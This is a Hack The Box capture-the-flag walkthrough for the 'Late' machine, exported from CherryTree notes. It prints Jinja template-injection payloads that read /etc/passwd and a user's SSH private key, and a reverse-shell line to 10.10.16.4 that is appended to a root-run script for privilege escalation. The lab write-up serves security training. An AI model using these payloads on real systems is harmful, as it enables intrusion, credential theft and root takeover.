<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>late</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>late</h1><br/><strong><h1>HTB: Late</h1></strong><br /><br /><img src="images/33-1.png" alt="images/33-1.png" /><br /><br /><br />When we look on the homepage or in source code we have a reference to: <strong>http;//images.late.htb</strong><br /><br />We add it in hosts file as.<br /><br /><strong>10.10.11.156    images.late.htb</strong><br /><br />We visit images.late.htb<br /><br />It is a OCR site. It will scan out texts from images.<br /><br /><br />Here we try <strong>Server Side Template Injection(SSTI)</strong><br /><br /><em><strong>https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</strong></em><br /><br />The first Payloads to test.<br /><br />{{7*7}}<br />${7*7}<br />&lt;%= 7*7 %&gt;<br />${{7*7}}<br />#{7*7}<br /><br /><br />We write the above in <strong>mousepad</strong> and take a screenshot in <strong>flameshot</strong>,  then save the image.<br />When we upload the image, we got result.txt<br /><br />It was evaluating the value for first payload <strong>{{7*7}}</strong>  to <strong>49</strong> confirming that the app is vulnerable to SSTI.<br /><br /><br />Upon Researching the tools. We find that backend is <strong>Flask</strong> which uses <strong>Jinja</strong><br /><br />Searching for <strong>jinja</strong> specific exploit in the hacktricks link, we found the following.<br /><br /><img src="images/33-2.png" alt="images/33-2.png" /><br /><br /><strong>{{ get_flashed_messages.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read() }}</strong><br /><br /><br />once we run this using image. We got the output in results.txt<br /><br />Then we read the id_rsa file and copy its contents to a local id_rsa file.<br /><br /><strong>{{ get_flashed_messages.__globals__.__builtins__.open(&quot;/home/svc_acc/.ssh/id_rsa&quot;).read() }}</strong><br /><br />We copy the contents of result.txt into a <strong>local id_rsa file</strong><br /><strong>chmod 600 id_rsa</strong><br /><br /><strong>ssh -i id_rsa svc_acc@10.10.11.156</strong><br /><br />Now we can ssh into user account without any password.<br /><br /><strong>Privilege Escalation</strong><br /><br />I ran LINPeas in the server and it showed a vulnerable script file.<br /><strong>/usr/local/sbin/ssh-alert.sh</strong><br /><br />This file runs as root whenever a ssh connection is made. This can be verified using <strong>pspy64</strong> and observing the processes.<br /><br />On Paper it seems we have write access to <strong>/usr/local/sbin/ssh-alert.sh</strong><br />But upon writing we fail.<br /><br /><strong>lsattr /usr/local/sbin/ssh-alert.sh</strong><br />Shows us that only append is possible.<br /><br />so we make a file containing a reverse shell in /tmp folder.<br /><br /><strong>echo ‘/bin/sh -i &gt;&amp; /dev/tcp/10.10.16.4/6666 0&gt;&amp;1’ &gt; /tmp/append.txt</strong><br /><br />Then we run the following command to append the payload inside the script<br /><br /><strong>cat /tmp/appendt.txt &gt;&gt; /usr/local/sbin/ssh-alert.sh</strong><br /><strong>Note:</strong> After each ssh login, this file is refreshed.<br />So as soon as we append this payload.<br />Start listener and make another ssh connection to the machine<br /><br />This is give us a root shell in the listner.<br /><br />Thanks!!</div>
</body>
</html>
